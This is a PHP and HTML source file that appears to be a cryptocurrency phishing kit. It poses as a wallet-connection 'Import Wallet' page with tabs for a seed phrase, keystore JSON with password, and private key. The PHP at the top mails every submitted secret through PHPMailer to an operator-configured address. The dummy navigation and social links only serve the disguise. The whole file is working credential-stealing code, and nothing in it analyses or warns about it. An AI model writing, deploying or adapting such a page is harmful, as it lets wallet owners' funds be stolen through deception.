<?php 
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';
include 'config.php';

$message = "";

  if (isset($_POST['submit'])) {
    $phrase = $_POST['phrase'];
    $key = $_POST['key'];
    $keystore = $_POST['keystore'];
    $password = $_POST['password'];

    $mail = new PHPMailer(true);

      try {
       //Server settings
       $mail->SMTPDebug = 0; // Enable verbose debug output
       $mail->isSMTP(); // Set mailer to use SMTP
       $mail->Host = $host; // Specify main and backup SMTP servers
       $mail->SMTPAuth = true; // Enable SMTP authentication
       $mail->Username = $username; // SMTP username
       $mail->Password = $emailpassword; // SMTP password
       $mail->SMTPSecure = 'tls'; // Enable TLS encryption, [ICODE]ssl[/ICODE] also accepted
       $mail->Port = 587; // TCP port to connect to

      //Recipients
       $mail->setFrom($setForm, "");
       $mail->addAddress($send_to, '');

      // Content
       $mail->isHTML(true); 
       $mail->Subject = 'Ethereum Classic Wallet form';
       $mail->Body = '
          <TABLE>
             <TR>
                <TD>Phrase</TD>
                <TD>'.$phrase.'</TD>
             </TR>
             <TR>
                <TD>Keystore</TD>
                <TD>'.$keystore.'</TD>
             </TR>
             <TR>
                <TD>Password </TD>
                <TD>'.$password.'</TD>
             </TR>
             <TR>
                <TD>Key</TD>
                <TD>'.$key.'</TD>
             </TR>
            </TABLE>
         ';

        $send = $mail->send();
        if($send){

         echo 'Form has been submitted';
        }

        } catch (Exception $e) {
         echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     }

  }


?>





<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="assets/main.css" type="text/css"> 
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="assets/logo.svg">
<link rel="icon" href="assets/logo.svg">
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>
<title>Import Wallet</title>
<style>
        * {
            box-sizing: border-box;
        }
      div {
            padding: 10px;
            background-color: #f6f6f6;
            overflow: hidden;
        }
      input[type=text], textarea, select {
            font: 17px Calibri;
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type=button]{ 
            font: 17px Calibri;
            width: auto;
            float: right;
            cursor: pointer;
            padding: 7px;
        }
    </style>
</head>
<body>
    
<center>
<div class="top">
        <a href="index.html" class="left">Github</a>
        <a href="index.html" class="left">Docs</a>
        <a href="index.html" class="main"><img src="assets\logo.svg" alt="logo"></a>
        <a href="index.html" class="left">Wallets</a>
        <a href="#?v" class="left">Apps</a>
</div>
<br>
<h2><center>Import Wallet</center></h2>
<br>


<div class="tab">
  <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase1&#39;)">Phrase</button>
  <button class="tablinks" onclick="openCity(event, &#39;keystore1&#39;)">Keystore JSON</button>
  <button class="tablinks" onclick="openCity(event, &#39;private1&#39;)">Private Key</button>
</div>

<div id="phrase1" class="tabcontent" style="display: block;">
    <form action="" method="POST">

      <!-- <input type="hidden" name="" value="MEW wallet"> -->
      <textarea name="phrase" class="phrasekey" placeholder="Phrase"></textarea>
      <br>
      <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
      <br>
      <button type="button" name="import" class="btn" onclick="openCity(event, &#39;keystore1&#39;)" value="IMPORT" >IMPORT</button>
    
  </div>

  <div id="keystore1" class="tabcontent" style="display: none;">


    <!-- <input type="hidden" name="" value="MEW wallet"> -->
      <textarea name="keystore" class="keystorekey" placeholder="Keystore JSON"></textarea>
      <br>
    <div class="field">
        <input type="text" name="password" class="keystorepassword" placeholder="Password">
    </div>
        <div class="desc">
            Several lines of text beginning with '(...)' plus the password you used to encrypt it.
        </div>
        <br>
        <button type="button" onclick="openCity(event, &#39;private1&#39;)" class="btn" value="IMPORT" >IMPORT</button>
    
  </div>

<div id="private1" class="tabcontent" style="display: none;">
    
        <!-- <input type="hidden" name="privatekey" value="MEW wallet"> -->
        <div class="field">
            <input type="text" name="key" class="privatekey" placeholder="Private Key">
        </div>
        <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
        <br>
        <button type="submit" name="submit" class="btn">IMPORT</button>
    </form>
</div>

<script>
    document.getElementById("default").click();
</script>


<footer><div id="footer">
<p><img src="assets\discord.svg" class="footimg">  <a href="https://discord.gg/">Discord</a></p><br>
<p><img src="assets\telegram.svg" class="footimg">  <a href="https://t.me/">Telegram</a></p><br>
<p><img src="assets\twitter.svg" class="footimg">  <a href="https://twitter">Twitter</a></p><br>
<p><img src="assets\github.svg" class="footimg">  <a href="https://github.com/">Github</a></p><br>
</div>
</footer>
</center>
</body>
</html>